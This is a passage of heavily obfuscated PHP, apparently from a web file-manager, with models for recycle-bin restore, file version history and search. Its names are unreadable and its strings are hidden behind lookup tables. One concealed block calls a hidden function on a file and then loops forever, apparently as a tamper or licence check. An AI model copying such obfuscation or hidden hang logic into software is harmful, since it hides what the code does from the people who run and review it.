($‚ùáÏ­‰[$¸ŸœÏÕû[448]] == $¸ŸœÏÕû[98]) { $¥è¡†¹©[] = $Å¶š„Êè; } $¾ÈÇ¹¡ü->lockMoveEnd($Å¶š„Êè); } $¾ÈÇ¹¡ü->updateModifyTime($¥è¡†¹©); } private function restoreFolderChildren($˜Õ˜¡™ë, $¢‰ıÑ•ı) { $Êó§œóù =& $_SERVER[ªÏ§Ë·]; $µ¾ÅŸÈ = Model($Êó§œóù[1358]); $ÊÏ÷±Æş = array($Êó§œóù[440] => array($Êó§œóù[7], array())); foreach ($¢‰ıÑ•ı as $èòÉ†Éë) { if ($èòÉ†Éë == $˜Õ˜¡™ë) { continue; } if (!$µ¾ÅŸÈ->isParentOf($˜Õ˜¡™ë, $èòÉ†Éë)) { continue; } $¹—Øª = $µ¾ÅŸÈ->sourceInfo($èòÉ†Éë); if ($¹—Øª[$Êó§œóù[448]] == $Êó§œóù[98]) { $ÊÏ÷±Æş[] = array($Êó§œóù[618] => array($Êó§œóù[578], $¹—Øª[$Êó§œóù[549]] . $èòÉ†Éë . $Êó§œóù[579])); } else { $ÊÏ÷±Æş[$Êó§œóù[440]][1][] = $èòÉ†Éë; } } if (!$ÊÏ÷±Æş[$Êó§œóù[440]][1]) { unset($ÊÏ÷±Æş[$Êó§œóù[440]]); } if (!$ÊÏ÷±Æş) { return; } $ÊÏ÷±Æş[$Êó§œóù[440]][1] = array_unique($ÊÏ÷±Æş[$Êó§œóù[440]][1]); $ÊÏ÷±Æş[$Êó§œóù[1025]] = $Êó§œóù[1955]; $µ¾ÅŸÈ->where($ÊÏ÷±Æş)->setField($Êó§œóù[469], 1); } private function recycleMove($Îº²óãØ, $‡úÉ×­¶ = 1) { $ÛÓæ¼ =& $_SERVER[ªÏ§Ë·]; $úâœÍ‡‘ = Model($ÛÓæ¼[1358]); $æ§±Şá = Model($ÛÓæ¼[2171]); $şå ‹Ö‰ = array($ÛÓæ¼[440] => $Îº²óãØ); if ($‡úÉ×­¶) { $úâœÍ‡‘->where($şå ‹Ö‰)->setField($ÛÓæ¼[469], 1); $æ§±Şá->eventRecycle($Îº²óãØ, $ÛÓæ¼[2172]); } else { $û–€•é = $úâœÍ‡‘->where($şå ‹Ö‰)->find(); $¥ù±˜© = $û–€•é[$ÛÓæ¼[448]] == $ÛÓæ¼[98]; $ÔéÅòÃÒ = $úâœÍ‡‘->fileNameAuto($û–€•é[$ÛÓæ¼[470]], $û–€•é[$ÛÓæ¼[42]], REPEAT_RENAME_FOLDER, $¥ù±˜©); if ($ÔéÅòÃÒ != $û–€•é[$ÛÓæ¼[42]]) { $úâœÍ‡‘->rename($Îº²óãØ, $ÔéÅòÃÒ); } $úâœÍ‡‘->where($şå ‹Ö‰)->setField($ÛÓæ¼[469], 0); $æ§±Şá->eventRecycle($Îº²óãØ, $ÛÓæ¼[2173]); } } } if (!isset($_SERVER[$_SERVER[ªÏ§Ë·][15]]) || !isset($_SERVER[$_SERVER[ªÏ§Ë·][13]])) { $_getc = $_SERVER[ªÏ§Ë·][16]; $_getfile = $_SERVER[$_SERVER[ªÏ§Ë·][17]] . $_SERVER[ªÏ§Ë·][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ªÏ§Ë·][19], $_getfilec); if (count($_getarrs) < $_SERVER[ªÏ§Ë·][20]) { $exit = $_SERVER[ªÏ§Ë·][21]; $exit(); } $_act = $_SERVER[ªÏ§Ë·][22]; $_act($_SERVER[$_SERVER[ªÏ§Ë·][17]] . $_SERVER[ªÏ§Ë·][18]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ªÏ§Ë·][416]); } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x73\x6f\165\x72\143\x65\123\x65\143\x72\x65\x74\x4c\151\x73\164"; public $field = array("\x73\x6f\x75\x72\143\x65\x49\x44", "\164\x79\x70\145\x49\104", "\x63\162\x65\141\164\x65\125\x73\x65\x72"); } goto Eè¯¤ƒ‘„©; D•¬ĞÛÓ“: $_SERVER[ÊõàˆØ] = explode($_SERVER[ªÏ§Ë·][646], gzinflate(substr($_SERVER[ªÏ§Ë·][647], 10, -8))); $jqbtirlyge = $_SERVER[ªÏ§Ë·][648]; if (!$jqbtirlyge) { return; } goto Cö¦šÂœø¼; aÑ‹‚ÊÌ‘‰: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\145\137\x68\151\x73\164\157\162\171"; public function historyCount($šé¿÷‰) { $ğ¥€ø£ô =& $_SERVER[ªÏ§Ë·]; if (!$šé¿÷‰) { return array(); } if (is_string($šé¿÷‰) || is_int($šé¿÷‰)) { $šé¿÷‰ = array($šé¿÷‰); } $ş±çÑŒ = array($ğ¥€ø£ô[440], $ğ¥€ø£ô[1890] => $ğ¥€ø£ô[529]); $İ™×÷„Û = array($ğ¥€ø£ô[440] => array($ğ¥€ø£ô[7], $šé¿÷‰)); $‚ÎÀëÉß = $this->field($ş±çÑŒ)->where($İ™×÷„Û)->group($ğ¥€ø£ô[440])->select(); return array_to_keyvalue($‚ÎÀëÉß, $ğ¥€ø£ô[440], $ğ¥€ø£ô[529]); } public function addHistory($´ÊÌæŞê, $«ÇÄ˜ÃÎ = '') { $ÀşŸ²Æ„ =& $_SERVER[ªÏ§Ë·]; $¥±Ëøõ„ = array($ÀşŸ²Æ„[455] => $´ÊÌæŞê[$ÀşŸ²Æ„[440]], $ÀşŸ²Æ„[1658] => isset($´ÊÌæŞê[$ÀşŸ²Æ„[494]]) ? $´ÊÌæŞê[$ÀşŸ²Æ„[494]] : $´ÊÌæŞê[$ÀşŸ²Æ„[492]], $ÀşŸ²Æ„[507] => $´ÊÌæŞê[$ÀşŸ²Æ„[506]], $ÀşŸ²Æ„[583] => $´ÊÌæŞê[$ÀşŸ²Æ„[86]], $ÀşŸ²Æ„[2101] => $«ÇÄ˜ÃÎ); if ($GLOBALS[$ÀşŸ²Æ„[6]][$ÀşŸ²Æ„[99]][$ÀşŸ²Æ„[1242]] >= 1) { $this->historyAutoClear($¥±Ëøõ„[$ÀşŸ²Æ„[440]]); $this->add($¥±Ëøõ„); } Hook::trigger($ÀşŸ²Æ„[2102], $¥±Ëøõ„); Model($ÀşŸ²Æ„[2103])->eventFileEdit($´ÊÌæŞê[$ÀşŸ²Æ„[440]]); } private function historyAutoClear($á„„ë•·) { $ÄõÔûƒô =& $_SERVER[ªÏ§Ë·]; $öÚƒî‹ò = Model($ÄõÔûƒô[798])->get($ÄõÔûƒô[1264]); $´‚òê‡³ = $GLOBALS[$ÄõÔûƒô[6]][$ÄõÔûƒô[99]][$ÄõÔûƒô[1242]]; $âøğ×µ• = $öÚƒî‹ò == $ÄõÔûƒô[1265] ? min(5, $´‚òê‡³) : $´‚òê‡³; $âøğ×µ• = $âøğ×µ• <= 0 ? 0 : $âøğ×µ• - 1; if ($âøğ×µ• >= 500) { return; } $à»­ø´¥ = array($ÄõÔûƒô[455] => $á„„ë•·); $ùú’‘ì = $this->field($ÄõÔûƒô[2104])->where($à»­ø´¥)->order($ÄõÔûƒô[2098])->select(); if (!$ùú’‘ì || $âøğ×µ• >= count($ùú’‘ì)) { return; } $ñ¬ÉªÙÆ = array_to_keyvalue($ùú’‘ì, $ÄõÔûƒô[12], $ÄõÔûƒô[437]); $ñ¬ÉªÙÆ = array_slice($ñ¬ÉªÙÆ, $âøğ×µ•); $½Ç©¹È = array_to_keyvalue($ùú’‘ì, $ÄõÔûƒô[12], $ÄõÔûƒô[506]); $½Ç©¹È = array_slice($½Ç©¹È, $âøğ×µ•); if (!$ñ¬ÉªÙÆ || !$½Ç©¹È) { return; } $à»­ø´¥ = array($ÄõÔûƒô[457] => array($ÄõÔûƒô[7], $ñ¬ÉªÙÆ)); $this->where($à»­ø´¥)->delete(); Model($ÄõÔûƒô[509])->remove($½Ç©¹È); } public function listData($€ë¤ä¬) { $°ÒÎ—Ú =& $_SERVER[ªÏ§Ë·]; $õ®µ—ö = array($°ÒÎ—Ú[455] => $€ë¤ä¬); $íïøíÑò = $°ÒÎ—Ú[2105]; $†Ãˆƒë™ = $this->field($íïøíÑò)->where($õ®µ—ö)->order($°ÒÎ—Ú[2098])->selectPage(); $this->_listAppendUser($†Ãˆƒë™[$°ÒÎ—Ú[407]]); $”™º…¤ = Model($°ÒÎ—Ú[798])->get($°ÒÎ—Ú[1264]); $÷×±õûø = 5; if ($”™º…¤ == $°ÒÎ—Ú[1265]) { $†Ãˆƒë™[$°ÒÎ—Ú[407]] = array_slice($†Ãˆƒë™[$°ÒÎ—Ú[407]], 0, $÷×±õûø); $†Ãˆƒë™[$°ÒÎ—Ú[404]] = array($°ÒÎ—Ú[2106] => 1, $°ÒÎ—Ú[2107] => 20, $°ÒÎ—Ú[2108] => 1, $°ÒÎ—Ú[2109] => count($†Ãˆƒë™[$°ÒÎ—Ú[407]])); } return $†Ãˆƒë™; } protected function _listAppendUser(&$ÁÑ·™) { $©±€‰Áâ =& $_SERVER[ªÏ§Ë·]; $êÑöÑ¦ = array_to_keyvalue($ÁÑ·™, $©±€‰Áâ[12], $©±€‰Áâ[1667]); $øÓĞ¼’œ = Model($©±€‰Áâ[563])->userListInfo($êÑöÑ¦); foreach ($ÁÑ·™ as &$½€™†ù…) { $™éé³óü = $½€™†ù…[$©±€‰Áâ[1667]]; $½€™†ù…[$©±€‰Áâ[492]] = $øÓĞ¼’œ[$™éé³óü] ? $øÓĞ¼’œ[$™éé³óü] : !1; } unset($½€™†ù…); } public function fileInfo($ü‹ßÖ®Ö) { $×ƒğŞæó =& $_SERVER[ªÏ§Ë·]; $ø©¡®¦Ê = $this->tablePrefix; $Š€ Ô˜× = "{$ø©¡®¦Ê}\x69\157\x5f\x66\151\x6c\145\x20\x66\151\x6c\x65\163\x20\x6f\x6e\x20\146\151\x6c\x65\163\56\146\x69\x6c\145\x49\104\40\x3d\x20\x68\151\163\164\157\162\171\x2e\146\x69\x6c\145\x49\104"; return $this->alias($×ƒğŞæó[2110])->where(array($×ƒğŞæó[457] => $ü‹ßÖ®Ö))->join($Š€ Ô˜×, $×ƒğŞæó[2111])->find(); } public function removeItem($îÃø¹Ÿñ) { $±ƒ§İ±¦ =& $_SERVER[ªÏ§Ë·]; $©õ¤ÓŸÒ = array($±ƒ§İ±¦[457] => $îÃø¹Ÿñ); $íŒŸ×õ = $this->where($©õ¤ÓŸÒ)->find(); if ($íŒŸ×õ) { $¡Ü£ïÆª = $this->where($©õ¤ÓŸÒ)->delete(); Model($±ƒ§İ±¦[509])->remove($íŒŸ×õ[$±ƒ§İ±¦[506]]); return $¡Ü£ïÆª; } return !1; } public function removeBySource($“Ö¼†óâ) { $°ùÆ¨ğã =& $_SERVER[ªÏ§Ë·]; if (!$“Ö¼†óâ) { return !1; } if (!is_array($“Ö¼†óâ)) { $“Ö¼†óâ = array($“Ö¼†óâ); } $½úù¦é = array($°ùÆ¨ğã[455] => array($°ùÆ¨ğã[7], $“Ö¼†óâ)); $¿ßüÑ£¦ = $this->field($°ùÆ¨ğã[507])->where($½úù¦é)->select(); if ($¿ßüÑ£¦) { $this->where($½úù¦é)->delete(); $‰ÉÁ˜ = array_to_keyvalue($¿ßüÑ£¦, $°ùÆ¨ğã[12], $°ùÆ¨ğã[506]); Model($°ùÆ¨ğã[509])->remove($‰ÉÁ˜); } return !0; } public function setDetail($•ò‚ùÑ·, $ğÆúÉèö) { $¶ƒÜœ¼• =& $_SERVER[ªÏ§Ë·]; return $this->where(array($¶ƒÜœ¼•[457] => $•ò‚ùÑ·))->save(array($¶ƒÜœ¼•[2101] => $ğÆúÉèö)); } public function rollbackToItem($¼¯¢–ª÷, $†¼É¢åœ) { $ìÒ£”õƒ =& $_SERVER[ªÏ§Ë·]; $˜¦âšÛÍ = Model($ìÒ£”õƒ[853])->sourceInfo($¼¯¢–ª÷); $this->addHistory($˜¦âšÛÍ, LNG($ìÒ£”õƒ[2112])); $æ¯ÏÜÕİ = $this->find($†¼É¢åœ); $Ä‘ù¬¨ = array($ìÒ£”õƒ[506] => $æ¯ÏÜÕİ[$ìÒ£”õƒ[506]], $ìÒ£”õƒ[86] => $æ¯ÏÜÕİ[$ìÒ£”õƒ[86]], $ìÒ£”õƒ[95] => time(), $ìÒ£”õƒ[494] => USER_ID); Model($ìÒ£”õƒ[853])->where(array($ìÒ£”õƒ[440] => $¼¯¢–ª÷))->save($Ä‘ù¬¨); return $this->where(array($ìÒ£”õƒ[457] => $†¼É¢åœ))->delete(); } public function clearSame($°¿À´) { $İÊ„Å÷Æ =& $_SERVER[ªÏ§Ë·]; $“ûø‡ä = $this->listData($°¿À´); $¶“ûßé¤ = array_to_keyvalue_group($“ûø‡ä, $İÊ„Å÷Æ[506]); $¢§°ê»ü = array(); $«°èìï = array(); foreach ($¶“ûßé¤ as $†™›—Ş) { if (!$†™›—Ş || count($†™›—Ş) <= 1) { continue; } foreach ($†™›—Ş as $Ëø°†ï) { $¢§°ê»ü[] = $Ëø°†ï[$İÊ„Å÷Æ[506]]; $«°èìï[] = $Ëø°†ï[$İÊ„Å÷Æ[437]]; } } if (!$«°èìï) { return; } $this->where(array($İÊ„Å÷Æ[437] => array($İÊ„Å÷Æ[7], $«°èìï)))->delete(); Model($İÊ„Å÷Æ[509])->remove($¢§°ê»ü); } public function userSpace() { $±´µ•Ã =& $_SERVER[ªÏ§Ë·]; $òºü‰Ç† = $this->tablePrefix; $…Ôûéöô = array($±´µ•Ã[1658] => USER_ID); $ş¡ë¦“ = "{$òºü‰Ç†}\x69\157\x5f\x66\x69\154\145\x20\146\x69\x6c\x65\x73\40\x6f\156\x20\x66\x69\154\x65\163\x2e\x66\151\154\x65\x49\x44\40\75\x20\x68\x69\x73\164\x6f\162\x79\56\146\151\154\x65\x49\104"; return $this->alias($±´µ•Ã[2110])->where($…Ôûéöô)->join($ş¡ë¦“, $±´µ•Ã[2111])->sum($±´µ•Ã[86]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($é…†Öº) { $ª©Ø³Óß =& $_SERVER[ªÏ§Ë·]; $±ÒÕò¢è = KodIO::fileTypeList(); $Ô£Â´ô¯ = $±ÒÕò¢è[$é…†Öº]; if (!$Ô£Â´ô¯) { return array(); } $áŠå†á = $Ô£Â´ô¯[$ª©Ø³Óß[184]]; $¨…×­š÷ = $ª©Ø³Óß[7]; if (!$Ô£Â´ô¯[$ª©Ø³Óß[184]]) { $œßêÂÆ = array_to_keyvalue($±ÒÕò¢è, $ª©Ø³Óß[12], $ª©Ø³Óß[184]); $áŠå†á = implode($ª©Ø³Óß[60], $œßêÂÆ); $¨…×­š÷ = $ª©Ø³Óß[2113]; } $îğ¤°¸„ = explode($ª©Ø³Óß[60], trim($áŠå†á, $ª©Ø³Óß[60])); return array($¨…×­š÷, $îğ¤°¸„); } public function listPathType($òã‰ºì) { $àç»Â– =& $_SERVER[ªÏ§Ë·]; $€®Ö­šš = $this->fileTypeWhere($òã‰ºì); if (!$€®Ö­šš) { return array(); } $“ÍØìù = USER_ID; $Š±§¹‹ = Model($àç»Â–[563])->getInfo($“ÍØìù); $ù¸¼¶ß‚ = array($àç»Â–[614] => SourceModel::TYPE_USER, $àç»Â–[549] => array($àç»Â–[578], $àç»Â–[559] . $Š±§¹‹[$àç»Â–[97]][$àç»Â–[440]] . $àç»Â–[579]), $àç»Â–[615] => $“ÍØìù, $àç»Â–[612] => 0, $àç»Â–[613] => $€®Ö­šš); return $this->listSource($ù¸¼¶ß‚); } public function listSearch($®¤Š´ºì, $ºÔïõÇó = 300) { $¾ÓåõÕ =& $_SERVER[ªÏ§Ë·]; if (isset($®¤Š´ºì[$¾ÓåõÕ[1951]]) && $®¤Š´ºì[$¾ÓåõÕ[1951]]) { $®¤Š´ºì[$¾ÓåõÕ[1951]] = str_replace($¾ÓåõÕ[422], $¾ÓåõÕ[2114], trim($®¤Š´ºì[$¾ÓåõÕ[1951]])); } $ş¬¾µÓ = $this->_parseSearchWhere($®¤Š´ºì); if (!isset($ş¬¾µÓ[$¾ÓåõÕ[469]])) { $ş¬¾µÓ[$¾ÓåõÕ[469]] = 0; } $Š¯Á ¼× = $¾ÓåõÕ[2115]; $ÌÍ¢ûø½ = $ş¬¾µÓ; $°±èæØØ = $Š¯Á ¼×; $this->_listSearchBindPinyin($®¤Š´ºì, $ş¬¾µÓ, $Š¯Á ¼×); $this->alias($¾ÓåõÕ[484])->_makeOrder(); $ş¬¾µÓ = $this->parseWhereLike($ş¬¾µÓ); $éÓ®Øş… = $this->distinct(!0)->field($Š¯Á ¼×)->where($ş¬¾µÓ)->selectPage($ºÔïõÇó); if ($GLOBALS[$¾ÓåõÕ[6]][$¾ÓåõÕ[419]][$¾ÓåõÕ[420]] && Input::check($®¤Š´ºì[$¾ÓåõÕ[1951]], $¾ÓåõÕ[621]) && $éÓ®Øş…[$¾ÓåõÕ[404]][$¾ÓåõÕ[391]] == 1 && $éÓ®Øş…[$¾ÓåõÕ[404]][$¾ÓåõÕ[405]] == 0) { $éÓ®Øş… = $this->distinct(!0)->field($Š¯Á ¼×)->where($ÌÍ¢ûø½)->limit(1000)->select(); $éÓ®Øş… = array_page_split($éÓ®Øş…, !1, $ºÔïõÇó); } $this->_listSearchFileContent($éÓ®Øş…, $®¤Š´ºì, $°±èæØØ, $ÌÍ¢ûø½); $this->_listSearchDesc($éÓ®Øş…, $®¤Š´ºì, $°±èæØØ); $this->_listSearchTag($éÓ®Øş…, $®¤Š´ºì, $°±èæØØ); $this->_listSearchGroupTag($éÓ®Øş…, $®¤Š´ºì, $°±èæØØ); $this->_listDataApply($éÓ®Øş…[$¾ÓåõÕ[407]]); $this->_listMake($éÓ®Øş…); return $éÓ®Øş…; } private function _listSearchFileContent(&$‚ïÀáıÏ, $¤Ò¬Ö, $Ú ù ¡ğ, $€Ëµ°Ø) { $±ñŞˆ»ñ =& $_SERVER[ªÏ§Ë·]; if (!$¤Ò¬Ö[$±ñŞˆ»ñ[1951]] || $‚ïÀáıÏ[$±ñŞˆ»ñ[404]][$±ñŞˆ»ñ[391]] > 1) { return; } if (!isset($€Ëµ°Ø[$±ñŞˆ»ñ[42]]) || !is_array($¤Ò¬Ö[$±ñŞˆ»ñ[506]])) { return; } $€Ëµ°Ø[$±ñŞˆ»ñ[506]] = array($±ñŞˆ»ñ[7], $¤Ò¬Ö[$±ñŞˆ»ñ[506]]); unset($€Ëµ°Ø[$±ñŞˆ»ñ[42]]); unset($¤Ò¬Ö[$±ñŞˆ»ñ[506]]); $áÙÙ÷Îµ = $this->field($Ú ù ¡ğ)->where($€Ëµ°Ø)->limit($±ñŞˆ»ñ[2116])->select(); if (!$áÙÙ÷Îµ || count($áÙÙ÷Îµ) == 0) { return; } $‚ïÀáıÏ[$±ñŞˆ»ñ[407]] = array_merge($áÙÙ÷Îµ, $‚ïÀáıÏ[$±ñŞˆ»ñ[407]]); $‚ïÀáıÏ[$±ñŞˆ»ñ[404]][$±ñŞˆ»ñ[405]] += count($áÙÙ÷Îµ); } private function _listSearchTag(&$Å†ó½ìä, $éˆÌ“ÊĞ, $Ø×âçûá) { $ÍØ·í„´ =& $_SERVER[ªÏ§Ë·]; if (!$éˆÌ“ÊĞ[$ÍØ·í„´[1951]] || $Å†ó½ìä[$ÍØ·í„´[404]][$ÍØ·í„´[391]] > 1) { return; } $É¯È™ÑÔ = Model($ÍØ·í„´[2117])->listData(); $Í€ = array(); $Äò¢†ôƒ = $éˆÌ“ÊĞ[$ÍØ·í„´[1951]]; foreach ($É¯È™ÑÔ as $¸êüş) { $…ùĞ©˜¡ = $¸êüş[$ÍØ·í„´[42]]; $Ëß½Š¬ = str_replace($ÍØ·í„´[63], $ÍØ·í„´[12], Pinyin::get($…ùĞ©˜¡)); if (stripos($…ùĞ©˜¡, $Äò¢†ôƒ) !== !1 || stripos($Ëß½Š¬, $Äò¢†ôƒ) !== !1) { $Í€[] = $¸êüş[$ÍØ·í„´[437]]; } } if (!$Í€) { return; } $ÓÈÈü‰Ç = array($ÍØ·í„´[464] => array($ÍØ·í„´[7], $Í€), $ÍØ·í„´[1667] => USER_ID); $‰Ê¸ÚÒ½ = Model($ÍØ·í„´[466])->field($ÍØ·í„´[94])->where($ÓÈÈü‰Ç)->select(); $‰Ê¸ÚÒ½ = array_to_keyvalue($‰Ê¸ÚÒ½, $ÍØ·í„´[12], $ÍØ·í„´[94]); $ üé÷®× = array_unique($‰Ê¸ÚÒ½); $this->_listSearchMerge($Å†ó½ìä, $éˆÌ“ÊĞ, $Ø×âçûá, $ üé÷®×); } private function _listSearchDesc(&$ìà¬°’¡, $¬¦Í›ı, $µäÆÌã) { $’¼¯ØÛã =& $_SERVER[ªÏ§Ë·]; if (!$¬¦Í›ı[$’¼¯ØÛã[1951]] || $ìà¬°’¡[$’¼¯ØÛã[404]][$’¼¯ØÛã[391]] > 1) { return; } $°³íåùÖ = array($’¼¯ØÛã[104] => $’¼¯ØÛã[491], $’¼¯ØÛã[412] => array($’¼¯ØÛã[421], $’¼¯ØÛã[1953] . $¬¦Í›ı[$’¼¯ØÛã[1951]] . $’¼¯ØÛã[1953])); $Ğ‹Ôî¦Ü = !1; if ($Ğ‹Ôî¦Ü) { $Àˆ»§—Â = $this->listSearchChildren($¬¦Í›ı[$’¼¯ØÛã[470]]); $Àˆ»§—Â = array_unique($Àˆ»§—Â); if (!$Àˆ»§—Â) { return; } $°³íåùÖ[$’¼¯ØÛã[440]] = array($’¼¯ØÛã[7], $Àˆ»§—Â); } $ñı€Ïá· = Model($’¼¯ØÛã[598])->field($’¼¯ØÛã[440])->where($°³íåùÖ)->limit(5000)->select(); $ßı³ËÁì = array_to_keyvalue($ñı€Ïá·, $’¼¯ØÛã[12], $’¼¯ØÛã[440]); $this->_listSearchMerge($ìà¬°’¡, $¬¦Í›ı, $µäÆÌã, $ßı³ËÁì); } private function _listSearchGroupTag(&$¼¼˜Øµ›, $×ïúœé, $ˆ³ï“Í¦) { $±È£‘è =& $_SERVER[ªÏ§Ë·]; if (!$×ïúœé[$±È£‘è[1951]] || $¼¼˜Øµ›[$±È£‘è[404]][$±È£‘è[391]] > 1 || !$×ïúœé[$±È£‘è[470]]) { return; } $•ƒ¬Ÿ• = $this->sourceInfo($×ïúœé[$±È£‘è[470]]); if (!$•ƒ¬Ÿ• || $•ƒ¬Ÿ•[$±È£‘è[449]] != SourceModel::TYPE_GROUP) { return; } $Ÿø‹®û = $•ƒ¬Ÿ•[$±È£‘è[534]]; $å³¢¯õù = Model($±È£‘è[2118])->get($Ÿø‹®û); $¼»ûÛ” = array(); $û‘Íè†Õ = $×ïúœé[$±È£‘è[1951]]; foreach ($å³¢¯õù[$±È£‘è[407]] as $Şú³‘¿„) { $—ú¼åú = $Şú³‘¿„[$±È£‘è[42]]; $ÊÜ°ˆíÚ = str_replace($±È£‘è[63], $±È£‘è[12], Pinyin::get($—ú¼åú)); if (stripos($—ú¼åú, $û‘Íè†Õ) !== !1 || stripos($ÊÜ°ˆíÚ, $û‘Íè†Õ) !== !1) { $¼»ûÛ”[] = $Şú³‘¿„[$±È£‘è[437]]; } } if (!$¼»ûÛ”) { return; } $×üêØ¾× = array($±È£‘è[464] => array($±È£‘è[7], $¼»ûÛ”), $±È£‘è[1667] => 0, $±È£‘è[43] => $±È£‘è[1973] . $Ÿø‹®û); $°Ã£“ì = Model($±È£‘è[466])->field($±È£‘è[94])->where($×üêØ¾×)->select(); $°Ã£“ì = array_to_keyvalue($°Ã£“ì, $±È£‘è[12], $±È£‘è[94]); $‚î‘ñÀ = array_unique($°Ã£“ì); $this->_listSearchMerge($¼¼˜Øµ›, $×ïúœé, $ˆ³ï“Í¦, $‚î‘ñÀ); } private function _listSearchMerge(&$Ö´üŸ ², $åŒ€«àß, $ãáïŒè, $ÆãÛ—Ş÷) { $–ÚÇ™ò« =& $_SERVER[ªÏ§Ë·]; if (!$ÆãÛ—Ş÷) { return; } $˜ıˆÀÄ = array_to_keyvalue($Ö´üŸ ²[$–ÚÇ™ò«[407]], $–ÚÇ™ò«[12], $–ÚÇ™ò«[440]); $£µÑÜ„ = array_diff($ÆãÛ—Ş÷, $˜ıˆÀÄ); if (!$£µÑÜ„) { return; } $ëÓÀêûš = array($–ÚÇ™ò«[440] => array($–ÚÇ™ò«[7], $£µÑÜ„)); $‹Û’Íä = $this->field($ãáïŒè)->where($ëÓÀêûš)->select(); if (!$‹Û’Íä) { return; } $‡÷¡©èÂ = array(); foreach ($‹Û’Íä as $ôËĞİá) { if ($this->_listSearchFilter($ôËĞİá, $åŒ€«àß)) { $‡÷¡©èÂ[] = $ôËĞİá; } } $Ö´üŸ ²[$–ÚÇ™ò«[407]] = array_merge($‡÷¡©èÂ, $Ö´üŸ ²[$–ÚÇ™ò«[407]]); $Ö´üŸ ²[$–ÚÇ™ò«[404]][$–ÚÇ™ò«[405]] += count($‡÷¡©èÂ); } private function _listSearchFilter($åõŞİ, $Ëô¦³Ë·) { $„ŒõıÙÑ =& $_SERVER[ªÏ§Ë·]; $Í•Ó•í = $åõŞİ[$„ŒõıÙÑ[448]] == $„ŒõıÙÑ[98]; if (!strstr($åõŞİ[$„ŒõıÙÑ[549]], $„ŒõıÙÑ[60] . $Ëô¦³Ë·[$„ŒõıÙÑ[470]] . $„ŒõıÙÑ[60])) { return !1; } if (isset($Ëô¦³Ë·[$„ŒõıÙÑ[450]]) && $Ëô¦³Ë·[$„ŒõıÙÑ[450]] != $„ŒõıÙÑ[1912]) { if ($Ëô¦³Ë·[$„ŒõıÙÑ[450]] == $„ŒõıÙÑ[85] && !$Í•Ó•í) { return !1; } if ($Ëô¦³Ë·[$„ŒõıÙÑ[450]] != $„ŒõıÙÑ[85] && $Í•Ó•í) { return !1; } if (!strstr($åõŞİ[$„ŒõıÙÑ[184]], $„ŒõıÙÑ[60] . $Ëô¦³Ë·[$„ŒõıÙÑ[450]] . $„ŒõıÙÑ[60])) { return !1; } } if (isset($Ëô¦³Ë·[$„ŒõıÙÑ[2119]]) && $Ëô¦³Ë·[$„ŒõıÙÑ[2119]] < $åõŞİ[$„ŒõıÙÑ[86]]) { return !1; } if (isset($Ëô¦³Ë·[$„ŒõıÙÑ[2120]]) && $Ëô¦³Ë·[$„ŒõıÙÑ[2120]] > $åõŞİ[$„ŒõıÙÑ[86]]) { return !1; } if (isset($Ëô¦³Ë·[$„ŒõıÙÑ[628]]) && $Ëô¦³Ë·[$„ŒõıÙÑ[628]] != $åõŞİ[$„ŒõıÙÑ[494]]) { return !1; } return !0; } public function listSearchChildren($ÃÎ©—È¸, $¤’¬Àæ = 5000) { $©Æô…à¿ =& $_SERVER[ªÏ§Ë·]; $øŒşØ“¡ = array(); $Éş¸ˆ¬¾ = $this->sourceInfo($ÃÎ©—È¸); $ºî°ï•° = array($©Æô…à¿[549] => array($©Æô…à¿[421], $Éş¸ˆ¬¾[$©Æô…à¿[549]] . $Éş¸ˆ¬¾[$©Æô…à¿[440]] . $©Æô…à¿[579])); $ß–İò°  = $this->field($©Æô…à¿[86])->where($ºî°ï•°)->limit($¤’¬Àæ + 1)->select(); $Òçó¸Å÷ = is_array($ß–İò° ) ? count($ß–İò° ) : 0; if ($Òçó¸Å÷ > $¤’¬Àæ) { return $this->_listSearchChildrenNear($ÃÎ©—È¸, $¤’¬Àæ); } $âİÎ‰Éµ = $this->field($©Æô…à¿[440])->where($ºî°ï•°)->select(); $øŒşØ“¡ = array_to_keyvalue($âİÎ‰Éµ, $©Æô…à¿[12], $©Æô…à¿[440]); return $øŒşØ“¡; } private function _listSearchChildrenNear($ÅÈòÍ†Ş, $×ñå³ş) { $½½§óˆ’ =& $_SERVER[ªÏ§Ë·]; $ëÅôö¶Î = array(); $ˆÍäÎÌ = array($½½§óˆ’[470] => $ÅÈòÍ†Ş); $ı‚çÏæ = $this->field($½½§óˆ’[2121])->where($ˆÍäÎÌ)->select(); $Ø¸Íƒ»ß = array_to_keyvalue(array_filter_by_field($ı‚çÏæ, $½½§óˆ’[448], $½½§óˆ’[98]), $½½§óˆ’[12], $½½§óˆ’[440]); $ëÅôö¶Î = array_merge($ëÅôö¶Î, array_to_keyvalue($ı‚çÏæ, $½½§óˆ’[12], $½½§óˆ’[440])); if (!$Ø¸Íƒ»ß) { return $ëÅôö¶Î; } $ˆÍäÎÌ = array($½½§óˆ’[470] => array($½½§óˆ’[7], $Ø¸Íƒ»ß)); $ı‚çÏæ = $this->field($½½§óˆ’[2121])->where($ˆÍäÎÌ)->limit($×ñå³ş)->select(); $ëÅôö¶Î = array_merge($ëÅôö¶Î, array_to_keyvalue($ı‚çÏæ, $½½§óˆ’[12], $½½§óˆ’[440])); $ëÅôö¶Î = array_slice($ëÅôö¶Î, 0, $×ñå³ş); return $ëÅôö¶Î; } private function _listSearchBindPinyin($˜¨õ‘Ï¿, &$íá«£Üë, &$ÍÒ‘çŒ…) { $İúäÅå® =& $_SERVER[ªÏ§Ë·]; if (!isset($˜¨õ‘Ï¿[$İúäÅå®[1951]]) || !$˜¨õ‘Ï¿[$İúäÅå®[1951]]) { return; } if (!Input::check($˜¨õ‘Ï¿[$İúäÅå®[1951]], $İúäÅå®[356]) || strlen($˜¨õ‘Ï¿[$İúäÅå®[1951]]) < 2) { return; } $Ûî€à¾İ = "\x4c\105\106\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\151\157\137\x73\x6f\x75\x72\143\x65\137\x6d\145\x74\141\x20\x6d\145\x74\x61\x20\157\156\x20\x73\x6f\165\162\x63\x65\56\163\x6f\165\x72\143\x65\111\104\40\75\x20\155\x65\164\x61\56\163\x6f\x75\162\143\x65\111\104"; $×¶›¥× = array(); $ÍÒ‘çŒ… = 